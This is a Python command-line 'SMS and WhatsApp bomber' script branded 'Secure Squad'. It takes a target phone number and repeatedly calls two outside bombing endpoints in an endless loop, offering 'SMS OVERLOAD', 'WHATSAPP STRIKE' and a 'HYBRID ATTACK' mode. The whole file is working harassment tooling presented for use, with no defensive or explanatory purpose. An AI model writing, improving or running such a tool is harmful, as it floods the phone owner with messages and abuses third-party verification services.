import os
import asyncio
import aiohttp
import time
import sys

# --- API Config ---
API_SMS = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php"
API_WP = "https://get-wp-creds-json-and-access-token.onrender.com/code"

# --- Colors ---
R = "\033[1;31m" # Red
G = "\033[1;32m" # Green
Y = "\033[1;33m" # Yellow
B = "\033[1;34m" # Blue
P = "\033[1;35m" # Purple
C = "\033[1;36m" # Cyan
W = "\033[1;37m" # White

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def line():
    print(f"{B}────────────────────────────────────────────────────────────{W}")

async def call_api(session, mode, target):
    try:
        if mode == "sms":
            async with session.get(API_SMS, params={"number": target}, timeout=5) as r:
                return r.status == 200
        elif mode == "wp":
            async with session.get(API_WP, params={"number": target}, timeout=5) as r:
                return r.status == 200
        return False
    except:
        return False

async def run_bomber(mode):
    clear()
    print(f"\n{R}  [!] SYSTEM ALERT: HIGH-SPEED PROTOCOL ACTIVE")
    line()
    target = input(f"{Y}  [+] TARGET PHONE (e.g. 923xxxxxxxxx): {W}").strip()
    line()
    print(f"{C}  [*] SECURE SQUAD ENGAGED... PRESS CTRL+C TO ABORT")
    line()

    success = 0
    async with aiohttp.ClientSession() as session:
        try:
            while True:
                if mode == "multi":
                    tasks = [call_api(session, "sms", target), call_api(session, "wp", target)]
                    await asyncio.gather(*tasks)
                    success += 2
                else:
                    await call_api(session, mode, target)
                    success += 1

                # Dynamic Counter with more flair
                sys.stdout.write(f"\r{G}  [+] SQUAD HITS SENT : {W}{success} {B}[{W}⚡{B}]{W}")
                sys.stdout.flush()
                await asyncio.sleep(0.01)
        except KeyboardInterrupt:
            print(f"\n\n{G}  [✔] SESSION COMPLETED")
            print(f"{Y}  [✔] TOTAL PACKETS DELIVERED: {W}{success}")
            line()
            input(f"{C}  [ Press Enter to Return ]{W}")

async def main():
    while True:
        clear()
        # New Secure Squad ASCII Art
        print(f"""{B}
  ____  _____ ____ _   _ ____  _____ 
 / ___|| ____/ ___| | | |  _ \| ____|
 \___ \|  _|| |   | | | | |_) |  _|  
  ___) | |__| |___| |_| |  _ <| |___ 
 |____/|_____\____|\___/|_| \_\_____|
                                      
  ____   ___  _   _     _     ____  
 / ___| / _ \| | | |   / \   |  _ \ 
 \___ \| | | | | | |  / _ \  | | | |
  ___) | |_| | |_| | / ___ \ | |_| |
 |____/ \__\_\\___/ /_/   \_\|____/ 
{C}────────────────────────────────────────────────────────────
{W}  [+] {G}CREATOR   {W}: {Y}MASROOR AHMED
{W}  [+] {G}TEAM      {W}: {B}SECURE SQUAD OFFICIAL
{W}  [+] {G}VERSION   {W}: {W}2.0 (STABLE)
{C}────────────────────────────────────────────────────────────{W}""")

        print(f"\n  {B}[01]{W} SMS OVERLOAD")
        print(f"  {B}[02]{W} WHATSAPP STRIKE")
        print(f"  {B}[03]{W} HYBRID ATTACK {R}(SMS + WP){W}")
        print(f"  {R}[00]{W} EXIT SYSTEM")
        
        line()
        choice = input(f"{Y}  [?] SECURE_SQUAD_INPUT >> {W}").strip()

        if choice in ["1", "01"]: await run_bomber("sms")
        elif choice in ["2", "02"]: await run_bomber("wp")
        elif choice in ["3", "03"]: await run_bomber("multi")
        elif choice in ["0", "00"]: 
            print(f"\n{R}  [!] DISCONNECTING...{W}")
            time.sleep(1)
            break

if __name__ == "__main__":
    asyncio.run(main())
